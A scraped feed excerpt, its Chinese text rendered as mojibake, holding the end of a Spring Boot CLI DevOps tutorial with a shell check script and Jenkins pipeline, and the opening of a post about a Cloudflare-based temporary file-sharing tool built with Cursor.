    <span class="hljs-comment"># æ£€æŸ¥ä»£ç ç»“æ„</span>
    <span class="hljs-keyword">if</span> [[ ! -d <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/src/main/java"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"âŒ ç¼ºå°‘æ ‡å‡†ä»£ç ç›®å½•ç»“æ„"</span>
        <span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># æ£€æŸ¥é…ç½®æ–‡ä»¶</span>
    <span class="hljs-keyword">if</span> [[ ! -f <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/src/main/resources/application.yml"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"âš ï¸  å»ºè®®ä½¿ç”¨ YAML æ ¼å¼é…ç½®æ–‡ä»¶"</span>
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-comment"># æ£€æŸ¥æµ‹è¯•è¦†ç›–ç‡</span>
    <span class="hljs-keyword">if</span> [[ ! -d <span class="hljs-string">"<span class="hljs-variable">$project_dir</span>/src/test"</span> ]]; <span class="hljs-keyword">then</span>
        <span class="hljs-built_in">echo</span> <span class="hljs-string">"âŒ ç¼ºå°‘æµ‹è¯•ä»£ç "</span>
        <span class="hljs-built_in">return</span> 1
    <span class="hljs-keyword">fi</span>
    
    <span class="hljs-built_in">echo</span> <span class="hljs-string">"âœ… ä»£ç è´¨é‡æ£€æŸ¥é€šè¿‡"</span>
    <span class="hljs-built_in">return</span> 0
}
</code></pre>
<h3 data-id="heading-41">åã€å®Œæ•´ DevOps æµæ°´çº¿é›†æˆ</h3>
<h4 data-id="heading-42">10.1 ç«¯åˆ°ç«¯è‡ªåŠ¨åŒ–æµç¨‹</h4>
<pre><code class="hljs language-mermaid" lang="mermaid">graph TB
    A[éœ€æ±‚åˆ†æ] --&gt; B[CLI é¡¹ç›®ç”Ÿæˆ]
    B --&gt; C[ä»£ç å¼€å‘]
    C --&gt; D[è‡ªåŠ¨åŒ–æµ‹è¯•]
    D --&gt; E[ä»£ç å®¡æŸ¥]
    E --&gt; F[å®‰å…¨æ‰«æ]
    F --&gt; G[æ„å»ºæ‰“åŒ…]
    G --&gt; H[å®¹å™¨åŒ–]
    H --&gt; I[éƒ¨ç½²åˆ°ç¯å¢ƒ]
    I --&gt; J[è‡ªåŠ¨åŒ–æµ‹è¯•]
    J --&gt; K[æ€§èƒ½æµ‹è¯•]
    K --&gt; L[ç”Ÿäº§éƒ¨ç½²]
    L --&gt; M[ç›‘æ§å‘Šè­¦]
    
    subgraph åé¦ˆå¾ªç¯
        M --&gt; N[æŒ‡æ ‡åˆ†æ]
        N --&gt; O[ä¼˜åŒ–å»ºè®®]
        O --&gt; B
    end
</code></pre>
<h4 data-id="heading-43">10.2 Jenkins æµæ°´çº¿é›†æˆ</h4>
<pre><code class="hljs language-groovy" lang="groovy">pipeline {
    agent any
    parameters {
        choice(
            name: 'PROJECT_TYPE',
            choices: ['web-basic', 'microservice', 'full-stack'],
            description: 'é¡¹ç›®ç±»å‹'
        )
    }
    stages {
        stage('Generate Project') {
            steps {
                script {
                    def depsMap = [
                        'web-basic': 'web,devtools',
                        'microservice': 'web,data-jpa,config-client',
                        'full-stack': 'web,data-jpa,security,actuator,thymeleaf'
                    ]
                    
                    sh """
                        spring init \
                            --build=gradle \
                            --java-version=17 \
                            --group-id=com.company.\${PROJECT_NAME} \
                            --dependencies=\${depsMap[params.PROJECT_TYPE]} \
                            \${PROJECT_NAME}
                    """
                }
            }
        }
    }
}
</code></pre>
<h3 data-id="heading-44">æ€»ç»“ï¼ˆä¸‹ç¯‡ï¼‰</h3>
<p>é€šè¿‡ä¸‹ç¯‡çš„æ·±å…¥å­¦ä¹ ï¼Œæˆ‘ä»¬æŒæ¡äº† Spring Boot CLI åœ¨æ¶æ„å¸ˆè§†è§’ä¸‹çš„é«˜çº§ç”¨æ³•ï¼š</p>
<h4 data-id="heading-45">ğŸ¯ æ ¸å¿ƒæˆå°±</h4>
<ol>
<li><strong>ğŸ”’ å®‰å…¨æ¶æ„</strong> - è®¾è®¡äº†å¤šå±‚æ¬¡çš„å®‰å…¨é˜²æŠ¤ä½“ç³»</li>
<li><strong>â˜ï¸ äº‘åŸç”Ÿé›†æˆ</strong> - å®ç°äº† Kubernetes å°±ç»ªçš„å¾®æœåŠ¡æ¶æ„</li>
<li><strong>âš¡ æ€§èƒ½ä¼˜åŒ–</strong> - æŒæ¡äº†ä¾èµ–ä¼˜åŒ–å’Œæ„å»ºæ€§èƒ½è°ƒä¼˜</li>
<li><strong>ğŸ”§ å®šåˆ¶æ‰©å±•</strong> - å­¦ä¼šäº†è‡ªå®šä¹‰ Initializr å’Œ CLI æ’ä»¶å¼€å‘</li>
<li><strong>ğŸ“Š è´¨é‡ä¿éšœ</strong> - å»ºç«‹äº†å®Œæ•´çš„æ¶æ„è´¨é‡å’Œä»£ç è§„èŒƒæ£€æŸ¥ä½“ç³»</li>
<li><strong>ğŸ”„ DevOps é›†æˆ</strong> - æ„å»ºäº†ç«¯åˆ°ç«¯çš„è‡ªåŠ¨åŒ–æµæ°´çº¿</li>
</ol>
<h4 data-id="heading-46">ğŸš€ ä»å·¥å…·ä½¿ç”¨è€…åˆ°æ•ˆç‡ä¸“å®¶</h4>
<p>Spring Boot CLI ä¸ä»…ä»…æ˜¯ä¸€ä¸ªé¡¹ç›®ç”Ÿæˆå·¥å…·ï¼Œå®ƒæ˜¯ç°ä»£è½¯ä»¶å¼€å‘ç†å¿µçš„ä½“ç°ã€‚é€šè¿‡å°† CLI æ·±åº¦é›†æˆåˆ°å¼€å‘æµç¨‹ä¸­ï¼Œæˆ‘ä»¬å®ç°äº†ï¼š</p>
<ul>
<li><strong>æ ‡å‡†åŒ–</strong> - ç»Ÿä¸€å›¢é˜ŸæŠ€æœ¯æ ˆå’Œé¡¹ç›®ç»“æ„</li>
<li><strong>è‡ªåŠ¨åŒ–</strong> - å‡å°‘é‡å¤åŠ³åŠ¨ï¼Œæå‡å¼€å‘æ•ˆç‡</li>
<li><strong>å¯è§†åŒ–</strong> - æ¸…æ™°çš„æ¶æ„æµç¨‹å›¾å’Œè´¨é‡è¯„ä¼°</li>
<li><strong>å¯æŒç»­</strong> - å»ºç«‹æŒç»­æ”¹è¿›çš„åé¦ˆå¾ªç¯</li>
</ul>
<h4 data-id="heading-47">ğŸŒŸ æœªæ¥å±•æœ›</h4>
<p>éšç€äº‘åŸç”Ÿå’Œ AI æŠ€æœ¯çš„ä¸æ–­å‘å±•ï¼ŒSpring Boot CLI ä¹Ÿå°†æŒç»­è¿›åŒ–ã€‚æˆ‘ä»¬å¯ä»¥æœŸå¾…ï¼š</p>
<ul>
<li>æ›´æ™ºèƒ½çš„ä¾èµ–æ¨èå’Œå†²çªè§£å†³</li>
<li>ä¸äº‘å¹³å°æ›´æ·±åº¦é›†æˆ</li>
<li>AI è¾…åŠ©çš„é¡¹ç›®æ¶æ„è®¾è®¡</li>
<li>æ›´å¼ºå¤§çš„å¯è§‚æµ‹æ€§é›†æˆ</li>
</ul>
<p>æŒæ¡ Spring Boot CLIï¼Œä¸ä»…æ˜¯æŒæ¡ä¸€ä¸ªå·¥å…·ï¼Œæ›´æ˜¯æ‹¥æŠ±é«˜æ•ˆã€è§„èŒƒçš„ç°ä»£è½¯ä»¶å¼€å‘èŒƒå¼ã€‚æ„¿ä½ åœ¨æœªæ¥çš„å¼€å‘ä¹‹æ—…ä¸­ï¼ŒæŒç»­è¿ç”¨è¿™äº›æŠ€èƒ½ï¼Œæ„å»ºæ›´åŠ å“è¶Šçš„è½¯ä»¶ç³»ç»Ÿã€‚</p>
<hr/></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[ã€å·²å¼€æºã€‘Cursor AI å¼€å‘å®æˆ˜ï¼šå°æ–‡ä»¶åœ¨çº¿äº’ä¼ å·¥å…·]]></title>    <link>https://juejin.cn/post/7576968345875021851</link>    <guid>https://juejin.cn/post/7576968345875021851</guid>    <pubDate>2025-11-27T05:40:29.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7576968345875021851" data-draft-id="7577189654472474650" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="ã€å·²å¼€æºã€‘Cursor AI å¼€å‘å®æˆ˜ï¼šå°æ–‡ä»¶åœ¨çº¿äº’ä¼ å·¥å…·"/> <meta itemprop="keywords" content="Cursor,AIç¼–ç¨‹,å¼€æº"/> <meta itemprop="datePublished" content="2025-11-27T05:40:29.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="æå®¢å¯†ç "/> <meta itemprop="url" content="https://juejin.cn/user/976022055165608"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            ã€å·²å¼€æºã€‘Cursor AI å¼€å‘å®æˆ˜ï¼šå°æ–‡ä»¶åœ¨çº¿äº’ä¼ å·¥å…·
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/976022055165608/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    æå®¢å¯†ç 
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-11-27T05:40:29.000Z" title="Thu Nov 27 2025 05:40:29 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-11-27
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»10åˆ†é’Ÿ
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><blockquote>
<p>çµæœºä¸€åŠ¨ + Cursor + å‡ ä¸ªå°æ—¶ = ä¸€ä¸ªå®Œæ•´çš„æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼è¿™å°±æ˜¯ AI ç¼–ç¨‹çš„é­…åŠ›~</p>
</blockquote>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9843123e06b941448177a7d804dc9ced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764826829&amp;x-signature=9O2lbQ5i2sC2tws%2BGEqUZ7LvvwI%3D" alt="å·¥å…·é¦–é¡µ" loading="lazy"/></p>
<h2 data-id="heading-0">å‰è¨€</h2>
<p>å¤§å®¶å¥½ï¼ä»Šå¤©ç»™å¤§å®¶åˆ†äº«ä¸€æ¬¡<strong>çº¯çº¯çš„ AI å¼€å‘å®æˆ˜</strong>ã€‚</p>
<p>å‘¨æœ«åœ¨å®¶é—²ç€æ²¡äº‹ï¼Œçªç„¶æƒ³åˆ°å¹³æ—¶å·¥ä½œä¸­ç»å¸¸éœ€è¦åœ¨è®¾å¤‡é—´ä¼ æ–‡ä»¶ï¼Œæˆ–è€…ä¸´æ—¶ç»™æœ‹å‹åˆ†äº«ä¸ªä¸œè¥¿ã€‚ç°æœ‰çš„å·¥å…·è¦ä¹ˆå¤ªé‡ï¼ˆç™¾åº¦ç½‘ç›˜ã€å¾®ä¿¡é‚£ç§ï¼‰ï¼Œè¦ä¹ˆä¸å¤Ÿå®‰å…¨ï¼ˆå…¬å¼€é“¾æ¥è°éƒ½èƒ½è®¿é—®ï¼‰ï¼Œè¦ä¹ˆå°±æ˜¯è¦ä»˜è´¹ã€‚</p>
<p><strong>çµæœºä¸€åŠ¨</strong>ï¼šèƒ½ä¸èƒ½åšä¸€ä¸ªè½»é‡çº§çš„ä¸´æ—¶æ–‡ä»¶ä¼ è¾“å·¥å…·ï¼Ÿ</p>
<p>ç„¶åæ‰“å¼€ Cursorï¼Œå¼€å§‹å’Œ AI èŠå¤©ï¼Œ<strong>å‡ ä¸ªå°æ—¶å</strong>ï¼Œä¸€ä¸ªå®Œæ•´çš„é¡¹ç›®å°±å‡ºæ¥äº† â€”â€” <strong>F2F.icu</strong>ï¼</p>
<p>å…³é”®æ˜¯ï¼Œæ•´ä¸ªé¡¹ç›®å®Œå…¨åŸºäº <strong>Cloudflare è¿™ä¸ªèµ›åšå¤§å–„äºº</strong>æä¾›çš„å…è´¹æœåŠ¡ï¼Œå®Œç¾çš„<strong>ç©·é¬¼å¼€å‘è€…å¥—é¤</strong>ï¼šä¸éœ€è¦ä¹°æœåŠ¡å™¨ã€ä¸éœ€è¦è£…æ•°æ®åº“ã€ä¸éœ€è¦æ‹…å¿ƒæµé‡è´¹ç”¨ï¼Œè¿˜è‡ªå¸¦å…¨çƒ CDN åŠ é€Ÿï¼</p>
<p><strong>åœ¨çº¿ä½“éªŒ</strong>ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Ff2f.icu" target="_blank" title="https://f2f.icu" ref="nofollow noopener noreferrer">f2f.icu</a></p>
<h2 data-id="heading-1">å·¥å…·æˆªå›¾</h2>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/9843123e06b941448177a7d804dc9ced~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764826829&amp;x-signature=9O2lbQ5i2sC2tws%2BGEqUZ7LvvwI%3D" alt="å·¥å…·é¦–é¡µ" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b04550dc96bc4bdd89ddc5438baafd10~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764826829&amp;x-signature=ELWA%2BnRFz5ed6k5T%2BP%2B80jZfc%2FU%3D" alt="å‘é€æ–‡ä»¶" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3927cc8ebd104c4892b3a447eabf5882~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764826829&amp;x-signature=UKV1p9Vk2tg5u5jJPxWEkpZJnFo%3D" alt="åˆ›å»ºåˆ†äº«" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d5dceb14c4fe451c92d1b597b0e8b5a5~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764826829&amp;x-signature=dSAQOYn%2BBEVlLLZfzeNxcFDIuwg%3D" alt="i18n å›½é™…åŒ–å‘é€" loading="lazy"/>
<img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/8f85588d59d648bdb08f651c63df6941~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5p6B5a6i5a-G56CB:q75.awebp?rk3s=f64ab15b&amp;x-expires=1764826829&amp;x-signature=rIh4jmIzUkE9a38qaDyYcoIiypE%3D" alt="i18n å›½é™…åŒ–æ¥æ”¶" loading="lazy"/></p>
<h2 data-id="heading-2">æ ¸å¿ƒç‰¹æ€§</h2>
<p>å…ˆè¯´è¯´è¿™ä¸ªå·¥å…·æœ‰å•¥äº®ç‚¹ï¼š</p>
<h3 data-id="heading-3">1. æç®€çš„ä½¿ç”¨ä½“éªŒ</h3>
<p>æ•´ä¸ªä½¿ç”¨æµç¨‹è¶…çº§ç®€å•ï¼š</p>
<ul>
<li><strong>å‘é€æ–¹</strong>ï¼šç”Ÿæˆä¸€ä¸ª 6 ä½åˆ†äº«ç  â†’ ä¸Šä¼ æ–‡ä»¶/æ–‡æœ¬ â†’ æŠŠç ç»™å¯¹æ–¹</li>
<li><strong>æ¥æ”¶æ–¹</strong>ï¼šè¾“å…¥ 6 ä½å–ä»¶ç  â†’ ä¸€é”®ä¸‹è½½</li>
</ul>
<p>å°±åƒå¿«é€’å–ä»¶ä¸€æ ·ï¼Œ<strong>6 ä¸ªå­—ç¬¦æå®šä¸€åˆ‡</strong>ã€‚ä¸ç”¨æ³¨å†Œç™»å½•ï¼Œä¸ç”¨è£… APPï¼Œæ‰“å¼€ç½‘é¡µå°±èƒ½ç”¨ã€‚</p>
<h3 data-id="heading-4">2. è‡ªåŠ¨é”€æ¯æœºåˆ¶</h3>
<p>è¿™ä¸ªæ˜¯æˆ‘æœ€å–œæ¬¢çš„è®¾è®¡ã€‚æ•°æ®çš„ç”Ÿå‘½å‘¨æœŸæ˜¯è¿™æ ·çš„ï¼š</p>
<ul>
<li>ä¸Šä¼ åå¦‚æœ <strong>1 å°æ—¶æ²¡äººä¸‹è½½</strong> â†’ è‡ªåŠ¨åˆ é™¤</li>
<li>ä¸‹è½½å <strong>1 åˆ†é’Ÿ</strong> â†’ è‡ªåŠ¨åˆ é™¤</li>
</ul>
<p>ä¸ºä»€ä¹ˆä¸‹è½½åä¸ç«‹å³åˆ é™¤ï¼Ÿå› ä¸ºè€ƒè™‘åˆ°ç½‘ç»œä¸ç¨³å®šçš„æƒ…å†µï¼Œç»™ç”¨æˆ·ä¸€ä¸ªã€Œé‡æ–°ä¸‹è½½ã€çš„ç¼“å†²æ—¶é—´ã€‚è¿™æ ·æ—¢ä¿æŠ¤äº†éšç§ï¼Œåˆæä¾›äº†å®¹é”™æœºåˆ¶ã€‚</p>
<h3 data-id="heading-5">3. å®Œå…¨å…è´¹ + é›¶ç»´æŠ¤</h3>
<p>è¿™æ˜¯é‡ç‚¹ï¼æ•´ä¸ªé¡¹ç›®å®Œå…¨åŸºäº Cloudflare çš„å…è´¹æœåŠ¡ï¼š</p>
<ul>
<li><strong>Cloudflare Pages</strong>ï¼šæ‰˜ç®¡å‰ç«¯ï¼ˆå…¨çƒ CDN åŠ é€Ÿï¼‰</li>
<li><strong>Cloudflare Workers</strong>ï¼šå¤„ç† API è¯·æ±‚ï¼ˆè¾¹ç¼˜è®¡ç®—ï¼‰</li>
<li><strong>Cloudflare KV</strong>ï¼šå­˜å‚¨æ–‡ä»¶æ•°æ®ï¼ˆè‡ªåŠ¨ TTL è¿‡æœŸåˆ é™¤ï¼‰</li>
</ul>
<p>å…è´¹é¢åº¦å¯¹ä¸ªäººä½¿ç”¨æ¥è¯´å®Œå…¨å¤Ÿç”¨ï¼š</p>
<ul>
<li>KV è¯»å–ï¼š<strong>æ¯å¤© 10 ä¸‡æ¬¡</strong></li>
<li>KV å†™å…¥ï¼š<strong>æ¯å¤© 1000 æ¬¡</strong></li>
<li>Workers è¯·æ±‚ï¼š<strong>æ¯å¤© 10 ä¸‡æ¬¡</strong></li>
</ul>
<p>è€Œä¸”å› ä¸ºç”¨äº† KV çš„åŸç”Ÿ TTL ç‰¹æ€§ï¼Œæ•°æ®è¿‡æœŸè‡ªåŠ¨æ¸…ç†ï¼Œ<strong>å®Œå…¨é›¶ç»´æŠ¤æˆæœ¬</strong>ã€‚</p>
<h2 data-id="heading-6">Cloudflare â€”â€” èµ›åšå¤§å–„äººçš„ç©·é¬¼å¼€å‘å¥—é¤</h2>
<p>è¿™é‡Œå¿…é¡»å¹ä¸€æ³¢ Cloudflareã€‚</p>
<p>ä½œä¸ºä¸€ä¸ªç©·é¬¼å¼€å‘è€…ï¼ˆbushiï¼‰ï¼ŒCloudflare ç®€ç›´æ˜¯ä¸šç•Œè‰¯å¿ƒï¼š</p>
<ul>
<li><strong>Cloudflare Pages</strong>ï¼šå…è´¹æ‰˜ç®¡é™æ€ç½‘ç«™ + å…¨çƒ CDN</li>
<li><strong>Cloudflare Workers</strong>ï¼šå…è´¹ Serverless å‡½æ•°ï¼ˆæ¯å¤© 10 ä¸‡æ¬¡è¯·æ±‚ï¼‰</li>
<li><strong>Cloudflare KV</strong>ï¼šå…è´¹é”®å€¼å­˜å‚¨ï¼ˆæ¯å¤© 10 ä¸‡æ¬¡è¯»å–ï¼‰</li>
<li><strong>å…è´¹ SSL è¯ä¹¦</strong>ï¼šè‡ªåŠ¨é…ç½® HTTPS</li>
<li><strong>å…è´¹ DDoS é˜²æŠ¤</strong>ï¼šè‡ªå¸¦å®‰å…¨é˜²æŠ¤</li>
</ul>
<p>è¿™å¥—ç»„åˆæ‹³ä¸‹æ¥ï¼Œå¯¹äºä¸ªäººé¡¹ç›®å’Œå°å‹åº”ç”¨æ¥è¯´ï¼Œ<strong>å®Œå…¨å¤Ÿç”¨è€Œä¸”å®Œå…¨å…è´¹</strong>ï¼</p>
<p>ä¸éœ€è¦ç»‘ä¿¡ç”¨å¡ï¼ˆåˆ’é‡ç‚¹ï¼‰ï¼Œæ³¨å†Œä¸ªè´¦å·å°±èƒ½ç”¨ã€‚è¿™ä½ å—å¾—äº†å—ï¼Ÿ</p>
<p>æ‰€ä»¥æˆ‘è¿™ä¸ªé¡¹ç›®ä»å¤´åˆ°å°¾çš„æˆæœ¬åªæœ‰ä¸ªå‡ å—é’±çš„åŸŸåè´¹ç”¨ã€‚</p>
<h2 data-id="heading-7">æŠ€æœ¯æ¶æ„</h2>
<p>ä¸‹é¢èŠèŠæŠ€æœ¯å®ç°ï¼Œè¿™ä¹Ÿæ˜¯æˆ‘å’Œ AI ä¸€èµ·è®¨è®ºå‡ºæ¥çš„æ–¹æ¡ˆã€‚</p>
<h3 data-id="heading-8">ä¸ºä»€ä¹ˆé€‰ KV è€Œä¸æ˜¯ R2ï¼Ÿ</h3>
<p>å¾ˆå¤šäººå¯èƒ½ä¼šé—®ï¼ŒCloudflare ä¸æ˜¯æœ‰å¯¹è±¡å­˜å‚¨ R2 å—ï¼Œä¸ºå•¥ä¸ç”¨ï¼Ÿ</p>
<p>è¿™é‡Œæˆ‘åšäº†ä¸ªå¯¹æ¯”ï¼š</p>






























<table><thead><tr><th>ç‰¹æ€§</th><th>KV å­˜å‚¨</th><th>R2 å¯¹è±¡å­˜å‚¨</th></tr></thead><tbody><tr><td>å•æ–‡ä»¶å¤§å°é™åˆ¶</td><td>25MB</td><td>5GB</td></tr><tr><td>TTL æ”¯æŒ</td><td>âœ… åŸç”Ÿæ”¯æŒ</td><td>âŒ éœ€è¦æ‰‹åŠ¨å®ç°å®šæ—¶æ¸…ç†</td></tr><tr><td>è¯»å†™å»¶è¿Ÿ</td><td>æä½ï¼ˆè¾¹ç¼˜èŠ‚ç‚¹ï¼‰</td><td>ç¨é«˜ï¼ˆåŒºåŸŸå­˜å‚¨ï¼‰</td></tr><tr><td>å…è´¹ä½¿ç”¨</td><td>âœ… ç›´æ¥ç”¨</td><td>âŒ éœ€è¦ç»‘å®šä¿¡ç”¨å¡</td></tr></tbody></table>
<p>å¯¹äº<strong>ä¸´æ—¶æ–‡ä»¶ä¼ è¾“</strong>è¿™ä¸ªåœºæ™¯ï¼ŒKV ç®€ç›´æ˜¯å®Œç¾é€‰æ‹©ï¼š</p>
<ol>
<li><strong>åŸç”Ÿ TTL</strong>ï¼šä¸Šä¼ æ—¶ç›´æ¥è®¾ç½®è¿‡æœŸæ—¶é—´ï¼Œåˆ°æœŸè‡ªåŠ¨åˆ é™¤ï¼Œä¸ç”¨å†™å®šæ—¶ä»»åŠ¡</li>
<li><strong>25MB å¤Ÿç”¨</strong>ï¼šæ—¥å¸¸ä¼ ä¸ªæ–‡æ¡£ã€å›¾ç‰‡ã€å°è§†é¢‘å®Œå…¨å¤Ÿ</li>
<li><strong>é›¶æˆæœ¬å¯åŠ¨</strong>ï¼šä¸éœ€è¦ç»‘å¡ï¼Œæ³¨å†Œå°±èƒ½ç”¨</li>
</ol>
